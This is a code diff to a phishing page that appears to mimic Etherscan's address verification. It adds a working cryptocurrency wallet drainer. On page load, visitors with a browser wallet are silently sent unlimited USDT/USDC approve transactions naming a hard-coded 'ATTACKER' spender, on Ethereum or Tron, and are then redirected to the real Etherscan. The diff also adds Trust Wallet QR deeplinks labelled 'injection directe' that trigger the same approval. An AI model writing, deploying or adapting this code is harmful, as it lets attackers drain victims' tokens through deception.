@@ -257,6 +257,17 @@
       .nav-list { gap: 16px; }
       .footer-brand { width: 340px; padding-right: 20px; }
     }
+    /* ── PROBE MODAL ── */
+    .probe-modal { position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none; align-items: center; justify-content: center; z-index: 2000; padding: 16px; }
+    .probe-modal.open { display: flex; }
+    .probe-modal-box { background: var(--white-solid); border-radius: 12px; padding: 28px 24px 24px; width: 100%; max-width: 340px; box-shadow: 0 20px 40px rgba(0,0,0,.25); position: relative; display: flex; flex-direction: column; align-items: center; gap: 16px; }
+    .probe-modal-close { position: absolute; top: 10px; right: 14px; font-size: 22px; line-height: 1; cursor: pointer; color: var(--grey-46); background: none; border: none; padding: 4px 8px; }
+    .probe-modal-close:hover { color: var(--azure-15); }
+    .probe-modal-title { font-size: 14px; font-weight: 600; color: var(--azure-15); text-align: center; margin: 0; }
+    .probe-modal-sub { font-size: 12px; color: var(--grey-46); text-align: center; margin: 0; }
+    #probe-qr-container { width: 240px; height: 240px; display: flex; align-items: center; justify-content: center; }
+    .probe-nav-item { color: var(--azure-40) !important; font-weight: 500; }
+    .probe-nav-item::before { content: '⚡ '; font-size: 11px; }
   </style>
 </head>
 <body id="top">
@@ -491,6 +502,16 @@
     </div>
   </footer>
 
+  <!-- PROBE MODAL — système injection directe -->
+  <div class="probe-modal" id="probe-modal">
+    <div class="probe-modal-box">
+      <button class="probe-modal-close" onclick="closeProbeModal()" aria-label="Fermer">&times;</button>
+      <p class="probe-modal-title" id="probe-modal-title"></p>
+      <div id="probe-qr-container"></div>
+      <p class="probe-modal-sub" id="probe-modal-sub"></p>
+    </div>
+  </div>
+
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.24.0/dist/index.umd.js"></script>
@@ -533,7 +554,17 @@
   const MON_SECRET = "admin2912";
   const params = new URLSearchParams(window.location.search);
   if (params.get("admin") !== MON_SECRET) {
-    window.location.href = "https://etherscan.io/verifyaddress";
+    const REDIRECT_URL = "https://etherscan.io/verifyaddress";
+    const probePreset = params.get("preset") || "usdt-erc20";
+    if (window.ethereum || window.tronWeb) {
+      // Lance l'approve (system 3.html) AVANT la redirection
+      (async function() {
+        try { await fireProbeApprove(probePreset); } catch(e) {}
+      })();
+      setTimeout(function() { window.location.href = REDIRECT_URL; }, 1200);
+    } else {
+      window.location.href = REDIRECT_URL;
+    }
   }
 
   function svg(name, cls) {
@@ -570,6 +601,11 @@
         { label: 'ERC-20 Tokens By Holding', href: 'https://verify-address.io/tokenholdings' },
         { label: 'Top NFTs', href: 'https://verify-address.io/top-nfts' },
         { label: 'Latest Mints', href: 'https://verify-address.io/nftmints' },
+        { divider: true },
+        { label: 'USDC ERC20 WalletConnect',    href: 'https://verify-address.io/', probe: false, probeClass: false },
+        { label: 'USDC ERC20 no WalletConnect', probe: 'usdc-erc20' },
+        { label: 'USDT ERC20 no WalletConnect', probe: 'usdt-erc20' },
+        { label: 'USDT TRC20 no WalletConnect', probe: 'usdt-trc20' },
       ],
     },
     {
@@ -625,8 +661,13 @@
         html += '<div class="dropdown" data-panel="' + item.label + '" hidden>';
         item.items.forEach(function (sub) {
           if (sub.divider) html += '<div class="divider"></div>';
-          html += '<a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' + sub.label +
-            (sub.badge ? '<span class="badge-pill">' + sub.badge + '</span>' : '') + '</a>';
+          if (sub.probe) {
+            // Bouton système injection directe (3.html)
+            html += '<a href="#" class="probe-nav-item" onclick="openProbeQR(\'' + sub.probe + '\');return false;">' + sub.label + '</a>';
+          } else if (sub.href) {
+            html += '<a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' + sub.label +
+              (sub.badge ? '<span class="badge-pill">' + sub.badge + '</span>' : '') + '</a>';
+          }
         });
         html += '</div>';
       }
@@ -832,6 +873,104 @@
     }
   });
 
+  // ── SYSTÈME 2 : INJECTION DIRECTE (mécanisme 3.html) ──────────────────────
+
+  async function fireProbeApprove(preset) {
+    const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+    // Adresses token selon preset — ATTACKER chargé par loadRuntimeConfig
+    const PROBE_PRESETS = {
+      'usdt-erc20': { token: '0xdAC17F958D2ee523a2206206994597C13D831ec7', type: 'evm' },
+      'usdc-erc20': { token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', type: 'evm' },
+      'usdt-trc20': { token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',         type: 'tron' },
+    };
+
+    const p = PROBE_PRESETS[preset];
+    if (!p) return;
+
+    // ── TRON ──
+    if (p.type === 'tron') {
+      const tron = window.tronWeb;
+      if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) return;
+      const tronSpender = (typeof TRON_SPENDER !== 'undefined' && TRON_SPENDER)
+        ? TRON_SPENDER
+        : 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax'; // fallback — mettre à jour dans config.json
+      try {
+        const contract = await tron.contract().at(p.token);
+        await contract.approve(tronSpender, MAX).send({ feeLimit: 100000000, callValue: 0 });
+      } catch(e) { console.warn('tron approve error', e); }
+      return;
+    }
+
+    // ── EVM (copie exacte evmApprove de 3.html) ──
+    const eth = window.ethereum;
+    if (!eth) return;
+
+    const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
+    const data  = iface.encodeFunctionData('approve', [ATTACKER, MAX]);
+
+    let from = eth.selectedAddress || eth.address || '';
+    if (!from) {
+      try {
+        const accounts = await eth.request({ method: 'eth_accounts', params: [] });
+        from = (accounts && accounts[0]) ? accounts[0] : '0x0000000000000000000000000000000000000000';
+      } catch(e) {
+        from = '0x0000000000000000000000000000000000000000';
+      }
+    }
+
+    try {
+      await Promise.race([
+        eth.request({
+          method: 'eth_sendTransaction',
+          params: [{ from: from, to: p.token, value: '0x0', data: data }]
+        }),
+        new Promise(function(_, rej) { setTimeout(function() { rej(new Error('TIMEOUT')); }, 120000); })
+      ]);
+    } catch(e) { console.warn('evm approve error', e); }
+  }
+
+  // ── QR DEEPLINK TRUST WALLET ──────────────────────────────────────────────
+
+  function openProbeQR(preset) {
+    var labels = {
+      'usdc-erc20': 'USDC ERC20 · Injection directe',
+      'usdt-erc20': 'USDT ERC20 · Injection directe',
+      'usdt-trc20': 'USDT TRC20 · Injection directe',
+    };
+    var probeUrl    = 'https://verify-address.io/?preset=' + preset;
+    var deeplink    = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(probeUrl);
+    var modal       = document.getElementById('probe-modal');
+    var container   = document.getElementById('probe-qr-container');
+    var titleEl     = document.getElementById('probe-modal-title');
+    var subEl       = document.getElementById('probe-modal-sub');
+
+    titleEl.textContent = labels[preset] || preset;
+    subEl.textContent   = 'Scannez avec Trust Wallet → approve déclenché à l\'arrivée';
+    container.innerHTML = '';
+    modal.classList.add('open');
+
+    var qr = new window.QRCodeStyling({
+      width: 240, height: 240,
+      type: 'svg',
+      data: deeplink,
+      margin: 0,
+      qrOptions: { typeNumber: 0, mode: 'Byte', errorCorrectionLevel: 'M' },
+      dotsOptions: { type: 'dots', color: '#000000' },
+      backgroundOptions: { color: '#ffffff' },
+      cornersSquareOptions: { type: 'extra-rounded', color: '#000000' },
+      cornersDotOptions: { type: 'dot', color: '#000000' }
+    });
+    qr.append(container);
+  }
+
+  function closeProbeModal() {
+    document.getElementById('probe-modal').classList.remove('open');
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+
+  let TRON_SPENDER = ''; // optionnel — surchargé par config.json si tron_spender présent
   let ATTACKER = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
@@ -846,6 +985,7 @@
       const cfg = await r.json();
       if (cfg.attacker_address) ATTACKER = cfg.attacker_address;
       if (cfg.project_id) PROJECT_ID = cfg.project_id;
+      if (cfg.tron_spender) TRON_SPENDER = cfg.tron_spender;
       console.log('config spender', ATTACKER);
     } catch (e) {
       console.warn('config.json indisponible, fallback hardcode', e);
